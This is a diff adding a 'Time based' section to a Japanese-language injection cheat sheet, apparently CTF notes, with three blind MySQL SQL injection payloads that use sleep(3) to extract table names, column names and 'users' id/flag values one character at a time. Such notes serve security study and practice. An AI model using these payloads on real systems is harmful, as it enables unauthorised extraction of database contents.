@@ -72,6 +72,26 @@ Jinja2
 | 部分文字列 | SUBSTRING(x, index, length) |
 | 長さ       | LENGTH(stuff)               |
 
+- Time based:
+
+テーブル名取得
+
+```
+'or if(substring((select group_concat(table_name) from information_schema.tables where table_type='BASE TABLE'),1,1)='a',sleep(3),0)or'
+```
+
+カラム名取得
+
+```
+'or if(substring((select group_concat(column_name) from information_schema.columns where table_name='users'),1,1)='a',sleep(3),0)or'
+```
+
+値取得
+
+```
+'or if(substring((select group_concat(concat(id, ',', flag)) from users),1,1)='a',sleep(3),0)or'
+```
+
 **SQLite3**
 
 | 説明                   | SQL                               |
